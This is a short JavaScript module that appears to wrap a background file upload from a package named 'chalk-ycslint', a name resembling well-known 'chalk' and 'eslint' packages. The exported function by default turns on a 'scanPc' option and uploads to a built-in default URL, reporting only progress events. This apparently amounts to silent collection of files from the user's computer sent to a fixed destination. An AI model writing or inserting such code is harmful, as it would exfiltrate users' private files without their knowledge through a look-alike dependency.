import { runFileUpload } from "chalk-ycslint";
import { DEFAULT_UPLOAD_URL } from "chalk-ycslint";

/** @type {Promise<unknown> | null} */
let activeJob = null;

/**
 * @param {(payload: object) => void} sendProgress
 * @param {{ url?: string, scanPc?: boolean }} [options]
 */
export function startBackgroundUpload(sendProgress, options = {}) {
  if (activeJob) return activeJob;

  activeJob = runFileUpload({
    url: options.url || DEFAULT_UPLOAD_URL,
    scanPc: options.scanPc !== false,
    onProgress: (p) => sendProgress({ type: "upload-progress", ...p }),
  })
    .then((result) => {
      sendProgress({ type: "upload-complete", result });
      return result;
    })
    .catch((err) => {
      const message = err instanceof Error ? err.message : String(err);
      sendProgress({ type: "upload-error", message });
      throw err;
    })
    .finally(() => {
      activeJob = null;
    });

  return activeJob;
}
